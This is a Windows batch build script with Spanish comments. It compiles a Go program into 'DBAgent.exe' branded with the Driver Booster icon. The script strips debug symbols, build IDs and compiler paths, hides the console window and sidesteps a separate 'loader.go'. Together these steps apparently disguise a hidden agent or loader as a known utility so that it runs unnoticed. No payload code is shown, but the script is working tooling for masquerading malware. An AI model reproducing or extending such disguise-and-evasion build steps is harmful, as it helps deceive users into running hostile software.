@echo off
REM build.bat — Compila DBAgent.exe con icono de Driver Booster
REM
REM Flags:
REM   -s -w          : elimina simbolos de debug
REM   -H windowsgui  : sin ventana de consola
REM   -buildid=      : elimina build ID de Go
REM   -trimpath      : elimina rutas del compilador

echo [*] Generando recurso con icono...
goversioninfo -platform-specific versioninfo.json

echo [*] Compilando DBAgent.exe...

REM Ocultar loader.go para evitar duplicado de main()
ren loader.go loader.go.bak 2>nul
go build -ldflags="-s -w -H windowsgui -buildid=" -trimpath -o dist\DBAgent.exe .
ren loader.go.bak loader.go 2>nul

REM Limpiar .syso generado
del resource_windows_*.syso 2>nul

echo.
if exist "dist\DBAgent.exe" (
    echo [OK] Ejecutable generado: dist\DBAgent.exe
    for %%I in ("dist\DBAgent.exe") do echo [*] Tamano: %%~zI bytes
) else (
    echo [ERROR] No se genero el ejecutable. Revisa los mensajes de arriba.
)
